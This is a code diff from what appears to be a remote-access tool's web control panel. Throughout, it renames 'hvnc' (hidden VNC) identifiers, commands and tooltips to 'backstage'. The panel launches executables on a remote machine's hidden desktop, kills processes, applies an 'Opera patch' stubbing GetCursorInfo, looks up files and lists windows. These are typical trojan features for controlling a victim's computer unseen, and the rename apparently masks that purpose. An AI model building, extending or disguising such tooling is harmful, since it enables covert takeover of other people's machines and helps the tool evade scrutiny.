         <label class="block text-xs text-slate-400 mb-1">Exe path</label>
-        <input id="hvncCustomExePath" type="text" placeholder="C:\\path\\to\\app.exe"
+        <input id="backstageCustomExePath" type="text" placeholder="C:\\path\\to\\app.exe"
           class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
         <label class="block text-xs text-slate-400 mb-1">Arguments (optional)</label>
-        <input id="hvncCustomExeArgs" type="text" placeholder="--flag value"
+        <input id="backstageCustomExeArgs" type="text" placeholder="--flag value"
           class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
         <label class="flex items-center gap-2 text-xs text-slate-400 mb-4 cursor-pointer select-none">
-          <input id="hvncCustomExeOperaPatch" type="checkbox"
+          <input id="backstageCustomExeOperaPatch" type="checkbox"
             class="accent-violet-500 w-3.5 h-3.5 rounded" />
           Apply Opera patch (stub GetCursorInfo)
         </label>
         <div class="flex justify-end gap-2">
-          <button id="hvncCustomExeCancel" class="button ghost text-sm">Cancel</button>
-          <button id="hvncCustomExeRun" class="button primary text-sm">Run</button>
+          <button id="backstageCustomExeCancel" class="button ghost text-sm">Cancel</button>
+          <button id="backstageCustomExeRun" class="button primary text-sm">Run</button>
         </div>
       </div>`;
     document.body.appendChild(overlay);
-    const pathInput = document.getElementById("hvncCustomExePath");
-    const argsInput = document.getElementById("hvncCustomExeArgs");
+    const pathInput = document.getElementById("backstageCustomExePath");
+    const argsInput = document.getElementById("backstageCustomExeArgs");
     pathInput.focus();
     function close() { overlay.remove(); }
-    document.getElementById("hvncCustomExeCancel").addEventListener("click", close);
+    document.getElementById("backstageCustomExeCancel").addEventListener("click", close);
     overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
     function run() {
       const exePath = pathInput.value.trim();
       if (!exePath) return;
       const args = argsInput.value.trim();
       const cmd = args ? `"${exePath}" ${args}` : `"${exePath}"`;
-      const operaPatch = document.getElementById("hvncCustomExeOperaPatch").checked;
-      sendCmd("hvnc_start_process", { path: cmd, opera_patch: operaPatch });
+      const operaPatch = document.getElementById("backstageCustomExeOperaPatch").checked;
+      sendCmd("backstage_start_process", { path: cmd, opera_patch: operaPatch });
       close();
     }
-    document.getElementById("hvncCustomExeRun").addEventListener("click", run);
+    document.getElementById("backstageCustomExeRun").addEventListener("click", run);
     pathInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); argsInput.focus(); } });
     argsInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); run(); } });
   }
@@ -1763,46 +1763,46 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function showLookupExeModal() {
     if (activeLookupOverlay) activeLookupOverlay.remove();
     const overlay = document.createElement("div");
-    overlay.id = "hvncLookupExeOverlay";
+    overlay.id = "backstageLookupExeOverlay";
     overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
     overlay.innerHTML = `
       <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-[480px] shadow-2xl flex flex-col" style="max-height:80vh">
         <div class="text-sm font-semibold text-slate-100 mb-3">Lookup Executable</div>
         <label class="block text-xs text-slate-400 mb-1">Exe filename (e.g. notepad.exe)</label>
         <div class="flex gap-2 mb-3">
-          <input id="hvncLookupExeName" type="text" placeholder="notepad.exe"
+          <input id="backstageLookupExeName" type="text" placeholder="notepad.exe"
             class="flex-1 bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-violet-500" />
-          <button id="hvncLookupBtn" class="button primary text-sm px-4">
+          <button id="backstageLookupBtn" class="button primary text-sm px-4">
             <i class="fa-solid fa-magnifying-glass mr-1"></i>Lookup
           </button>
         </div>
-        <div id="hvncLookupStatus" class="text-xs text-slate-500 mb-2 hidden">
+        <div id="backstageLookupStatus" class="text-xs text-slate-500 mb-2 hidden">
           <i class="fa-solid fa-spinner fa-spin mr-1"></i>Searching…
         </div>
-        <div id="hvncLookupResults" class="flex-1 overflow-y-auto min-h-[60px] max-h-[400px] bg-slate-950 border border-slate-800 rounded p-2">
+        <div id="backstageLookupResults" class="flex-1 overflow-y-auto min-h-[60px] max-h-[400px] bg-slate-950 border border-slate-800 rounded p-2">
           <div class="text-xs text-slate-600 text-center py-4">Results will appear here</div>
         </div>
         <div class="flex items-center mt-3">
           <label class="flex items-center gap-2 cursor-pointer select-none">
-            <input type="checkbox" id="hvncLookupKill" class="accent-red-500 w-4 h-4 rounded" />
+            <input type="checkbox" id="backstageLookupKill" class="accent-red-500 w-4 h-4 rounded" />
             <span class="text-xs text-slate-300">Kill before starting</span>
           </label>
           <div class="ml-auto">
-            <button id="hvncLookupClose" class="button ghost text-sm">Close</button>
+            <button id="backstageLookupClose" class="button ghost text-sm">Close</button>
           </div>
         </div>
       </div>`;
     document.body.appendChild(overlay);
     activeLookupOverlay = overlay;
 
-    const nameInput = document.getElementById("hvncLookupExeName");
-    const lookupBtn = document.getElementById("hvncLookupBtn");
-    const statusEl = document.getElementById("hvncLookupStatus");
-    const resultsEl = document.getElementById("hvncLookupResults");
+    const nameInput = document.getElementById("backstageLookupExeName");
+    const lookupBtn = document.getElementById("backstageLookupBtn");
+    const statusEl = document.getElementById("backstageLookupStatus");
+    const resultsEl = document.getElementById("backstageLookupResults");
     nameInput.focus();
 
     function close() { overlay.remove(); activeLookupOverlay = null; }
-    document.getElementById("hvncLookupClose").addEventListener("click", close);
+    document.getElementById("backstageLookupClose").addEventListener("click", close);
     overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
 
     function startLookup() {
@@ -1812,7 +1812,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       statusEl.classList.remove("hidden");
       lookupBtn.disabled = true;
       lookupBtn.classList.add("opacity-50");
-      sendCmd("hvnc_lookup", { exe });
+      sendCmd("backstage_lookup", { exe });
     }
 
     lookupBtn.addEventListener("click", startLookup);
@@ -1822,9 +1822,9 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function handleLookupResult(msg) {
     const overlay = activeLookupOverlay;
     if (!overlay) return;
-    const statusEl = document.getElementById("hvncLookupStatus");
-    const resultsEl = document.getElementById("hvncLookupResults");
-    const lookupBtn = document.getElementById("hvncLookupBtn");
+    const statusEl = document.getElementById("backstageLookupStatus");
+    const resultsEl = document.getElementById("backstageLookupResults");
+    const lookupBtn = document.getElementById("backstageLookupBtn");
     if (!resultsEl) return;
 
     if (msg.done) {
@@ -1852,11 +1852,11 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       item.dataset.lookupPath = msg.path;
       item.className = "w-full text-left px-2 py-1.5 rounded text-xs text-slate-200 hover:bg-violet-600/30 hover:text-violet-100 transition-colors font-mono truncate block";
       item.textContent = msg.path;
-      item.title = "Click to start in HVNC: " + msg.path;
+      item.title = "Click to start in backstage: " + msg.path;
       item.addEventListener("click", () => {
-        const killCheckbox = document.getElementById("hvncLookupKill");
+        const killCheckbox = document.getElementById("backstageLookupKill");
         const killExe = killCheckbox?.checked ? msg.exe : "";
-        sendCmd("hvnc_start_process", { path: '"' + msg.path + '"', kill_exe: killExe });
+        sendCmd("backstage_start_process", { path: '"' + msg.path + '"', kill_exe: killExe });
         item.classList.add("text-emerald-400");
         item.innerHTML = '<i class="fa-solid fa-check mr-1"></i>' + (killExe ? '(killed) ' : '') + msg.path;
       });
@@ -1888,7 +1888,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function openWindowMap() {
     if (!windowMapModal) return;
     windowMapModal.style.display = "flex";
-    sendCmd("hvnc_window_list", {});
+    sendCmd("backstage_window_list", {});
     if (windowMapCanvas) windowMapCanvas.innerHTML = '<div class="flex items-center justify-center h-40 text-slate-500 text-sm"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Loading…</div>';
     if (windowMapList) windowMapList.innerHTML = "";
   }
@@ -1900,7 +1900,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   if (windowMapBtn) windowMapBtn.addEventListener("click", openWindowMap);
   if (windowMapCloseBtn) windowMapCloseBtn.addEventListener("click", closeWindowMap);
   if (windowMapRefreshBtn) windowMapRefreshBtn.addEventListener("click", () => {
-    sendCmd("hvnc_window_list", {});
+    sendCmd("backstage_window_list", {});
     if (windowMapCanvas) windowMapCanvas.innerHTML = '<div class="flex items-center justify-center h-40 text-slate-500 text-sm"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Refreshing…</div>';
     if (windowMapList) windowMapList.innerHTML = "";
   });
